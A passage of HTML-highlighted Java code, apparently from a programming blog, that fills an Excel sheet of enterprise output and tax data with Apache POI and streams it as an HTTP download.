keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">//水平垂直居中</span>                            CellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>                            style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                            style<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getCreditCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getCreditCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTaxValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTaxValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getUpdateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getUpdateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getDataTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getDataTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getValueDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getValueDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getTCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getTCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getHCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>detail<span class="token punctuation">.</span><span class="token function">getHCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">default</span><span class="token operator">:</span>                                    <span class="token comment" spellcheck="true">// handle default case</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                        startRow<span class="token operator">++</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//企业产值数据为空或只有一条企业产值数据</span>                    SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>startRow<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//水平垂直居中</span>                        CellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>                        style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                        style<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getCreditCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getCreditCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTaxValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTaxValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getUpdateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getUpdateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDataTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDataTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValueDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValueDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">default</span><span class="token operator">:</span>                                <span class="token comment" spellcheck="true">// handle default case</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    startRow<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        //       文件形式输出到磁盘中</span><span class="token comment" spellcheck="true">//        FileOutputStream out = null;</span><span class="token comment" spellcheck="true">//        try {</span><span class="token comment" spellcheck="true">//            String uuid = UUID.randomUUID().toString();</span><span class="token comment" spellcheck="true">//            System.out.println(uuid);</span><span class="token comment" spellcheck="true">//            out = new FileOutputStream("E:\\" + "fileName2" + ".xlsx");</span><span class="token comment" spellcheck="true">//            workbook.write(out);</span><span class="token comment" spellcheck="true">//        } catch (Exception ex) {</span><span class="token comment" spellcheck="true">//            try {</span><span class="token comment" spellcheck="true">//                out.flush();</span><span class="token comment" spellcheck="true">//                out.close();</span><span class="token comment" spellcheck="true">//            } catch (IOException e) {</span><span class="token comment" spellcheck="true">//                e.printStackTrace();</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">// 设置输出流信息</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/octet-stream;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename=file.xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Pargam"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建输出流</span>        OutputStream outputStream <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将Workbook写入输出流</span>        workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>outputStream<span class="token 